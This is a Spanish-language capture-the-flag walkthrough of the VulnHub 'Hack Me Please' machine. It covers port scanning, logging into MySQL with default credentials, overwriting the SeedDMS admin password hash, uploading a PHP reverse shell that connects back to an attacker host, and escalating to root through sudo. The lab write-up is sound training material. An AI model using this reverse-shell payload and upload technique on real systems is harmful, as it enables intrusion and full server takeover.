---
icon: flag
---

# HACK ME PLEASE VulnHub

### Escaneo de puertos

```shell
nmap -p- --min-rate 5000 -sS <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 13:15 EDT
Nmap scan report for 192.168.5.143
Host is up (0.0011s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to the land of pwnland
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
| Not valid before: 2021-07-03T00:33:15
|_Not valid after:  2031-07-01T00:33:15
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 39
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, FoundRows, DontAllowDatabaseTableColumn, ODBCClient, LongColumnFlag, IgnoreSigpipes, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolNew, LongPassword, SupportsCompression, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x0D`1Ya!=    \x13]HJ\x12'^\x04\x0E\x0Fcx
|_  Auth Plugin Name: caching_sha2_password
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=5/25%Time=66521CC0%P=x86_64-pc-linux-gnu%
SF:r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTT
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSV
SF:ersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTC
SF:P,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCoo
SF:kie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNe
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStri
SF:ng,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x
SF:01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x2
SF:0message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Note
SF:sRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1
SF:a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,3
SF:2,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inva
SF:lid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
MAC Address: 00:0C:29:E6:47:9E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.09 ms 192.168.5.143

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

### Puerto 80

Si miramos el codigo de la pagina, vemos que hay un archivo de `javaScript` raro cuando lo insepccionamos llamado `js/main.js` que si entramos en el y bajamos un poco, nos encontramos con una ruta que parece ser un panel de login `/seeddms51x/seeddms-5.1.22/`, y si ponemos en la URL eso mismo, nos llevara a un panel de login...

```
URL = http://<IP>/seeddms51x/seeddms-5.1.22/out/out.Login.php?msg=Error+signing+in.+User+ID+or+password+incorrect.
```

Sabiendo que tenemos un `mysql` corriendo, tendremos que buscar por internet en github un repositorio que te explica como instalar el servidor `seeddms` y en el repositorio se puede ver las credenciales que se utilizan por defecto para conectarse al `mysql` las cuales van a funcionar para conectarnos nosotros...

URL = https://github.com/JustLikeIcarus/SeedDMS

```


    Create a data folder somewhere on your web server including the subdirectories staging, cache and lucene and make sure they are writable by your web server, but not accessible through the web.

For security reason the data folder should not be inside the public folders or should be protected by a .htaccess file.

If you install SeedDMS for the first time continue with the database setup.

    Create a new database on your web server e.g. for mysql: create database seeddms;
    Create a new user for the database with all permissions on the new database e.g. for mysql: grant all privileges on seeddms.* to seeddms@localhost identified by 'secret'; (replace 'secret' with you own password)
    Optionally import create_tables-innodb.sql in the new database e.g. for mysql:

        cat create_tables-innodb.sql | mysql -useeddms -p seeddms This step can also be done by the install tool.

    create a file ENABLE_INSTALL_TOOL in the conf directory and point your browser at http://hostname/seeddms/install
```

Ahi vemos que esta utilizando el siguiente comando...

```shell
cat create_tables-innodb.sql | mysql -useeddms -p seeddms
```

Por lo que probaremos esas credenciales...

```shell
mysql -h <IP> -useeddms -pseeddms
```

Si hacemos esto estaremos dentro de `mysql`...

```mysql
show databases;
```

Info:

```
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| seeddms            |
| sys                |
+--------------------+
5 rows in set (0,005 sec)
```

Elegiremos la llamada `seeddms`...

```mysql
use seeddms;
```

```mysql
show tables;
```

Info:

```
MySQL [seeddms]> show tables;
+------------------------------+
| Tables_in_seeddms            |
+------------------------------+
| tblACLs                      |
| tblAttributeDefinitions      |
| tblCategory                  |
| tblDocumentApproveLog        |
| tblDocumentApprovers         |
| tblDocumentAttributes        |
| tblDocumentCategory          |
| tblDocumentContent           |
| tblDocumentContentAttributes |
| tblDocumentFiles             |
| tblDocumentLinks             |
| tblDocumentLocks             |
| tblDocumentReviewLog         |
| tblDocumentReviewers         |
| tblDocumentStatus            |
| tblDocumentStatusLog         |
| tblDocuments                 |
| tblEvents                    |
| tblFolderAttributes          |
| tblFolders                   |
| tblGroupMembers              |
| tblGroups                    |
| tblKeywordCategories         |
| tblKeywords                  |
| tblMandatoryApprovers        |
| tblMandatoryReviewers        |
| tblNotify                    |
| tblSessions                  |
| tblUserImages                |
| tblUserPasswordHistory       |
| tblUserPasswordRequest       |
| tblUsers                     |
| tblVersion                   |
| tblWorkflowActions           |
| tblWorkflowDocumentContent   |
| tblWorkflowLog               |
| tblWorkflowMandatoryWorkflow |
| tblWorkflowStates            |
| tblWorkflowTransitionGroups  |
| tblWorkflowTransitionUsers   |
| tblWorkflowTransitions       |
| tblWorkflows                 |
| users                        |
+------------------------------+
43 rows in set (0,002 sec)
```

Si elegimos la tabla `users`...

```mysql
select * from users;
```

Info:

```
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0,003 sec)
```

Veremos unas credenciales, pero no serviran para el panel de `login`...

Si nos vamos a otra tabla llamada `tblUsers`...

```mysql
select * from tblUsers;
```

Info:

```
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
| id | login | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
|  1 | admin | f9ef2c539bad8a6d2f3432b6d49ab51a | Administrator | address@server.com | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
|  2 | guest | NULL                             | Guest User    | NULL               |          |       |         |    2 |      0 | NULL                |             0 |        0 |     0 |       NULL |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
2 rows in set (0,001 sec)
```

Vemos que estan las credenciales del usuario `admin` y su contraseña esta codificada en `md5`, pero es imposible crackearla, por lo que se la cambiaremos haciendo lo siguiente...

```shell
echo -n "admin" | md5sum
```

```
21232f297a57a5a743894a0e4a801fc3
```

Y si nos vamos a `mysql` tendremos que hacer lo siguiente para actualizarla...

```mysql
UPDATE tblUsers SET pwd='21232f297a57a5a743894a0e4a801fc3' WHERE login='admin';
```

```mysql
select * from tblUsers;
```

Info:

```
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
| id | login | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
|  1 | admin | 21232f297a57a5a743894a0e4a801fc3 | Administrator | address@server.com | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
|  2 | guest | NULL                             | Guest User    | NULL               |          |       |         |    2 |      0 | NULL                |             0 |        0 |     0 |       NULL |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
2 rows in set (0,001 sec)
```

Con esto vemos que lo hemos cambiado todo correctamente, por lo que nos logeamos en el panel de `login`...

> Credentials

```
User = admin
Password = admin
```

Una vez que nos hayamos logeado en el panel y estemos dentro con nuestro usuario `admin` haremos lo siguiente...

Si buscamos un exploit para este panel de admin, encontraremos el siguiente...

URL = https://www.exploit-db.com/exploits/47022

Siguiendo estos pasos podremos subir un archivo `.php` y hacernos una `Reverse Shell` para conectarnos como `www-data`, haciendo lo siguiente...

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Una vez teniendo este archivo, nos dirigimos a la pestaña llamada `Add Documents` dentro de esa pestaña en la casilla `name` pondremos el nombre que queramos en mi caso `shell.php` y donde pone `Cargar archivo` selecionaremos nuestro archivo `.php`, donde pone la casilla de `version` no lo tocamos por que se tiene que quedar en el numero `1`, una vez hecho esto guardamos los cambios y nos vamos a donde esta el archivo para poner el cursor encima del archivo y ver que `ID` tiene para hacer lo siguiente...

!\[\[Pasted image 20240526115710.png]] !\[\[Pasted image 20240526115729.png]] !\[\[Pasted image 20240526115744.png]] !\[\[Pasted image 20240526115755.png]] !\[\[Pasted image 20240526115814.png]] !\[\[Pasted image 20240526115856.png]] Ahi vemos la `ID` llamado `documentid=7`, por lo que la direccion del archivo sera el siguiente...

```
URL = http://<IP>/seeddms51x/data/1048576/<ID>/1.php
```

Metiendo eso nos llevara al archivo y si estamos a la escucha nos hara una shell...

```shell
nc -lvnp <PORT>
```

Una vez hecho esto ya estariamos con la shell de `www-data`, por lo que la sanitizamos...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a la `/home/` veremos el usuario `saket` el mismo que encontramos en la base de datos de `mysql`, haremos lo siguiente...

```shell
su saket
```

Y ponemos la contraseña que encontramos en l`mysql`...

```
Password = Saket@#$1337
```

Una vez siendo el usuario si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Por lo que si hacemos...

```shell
sudo su
```

Seremos `root` y ya lo habriamos terminado ;D
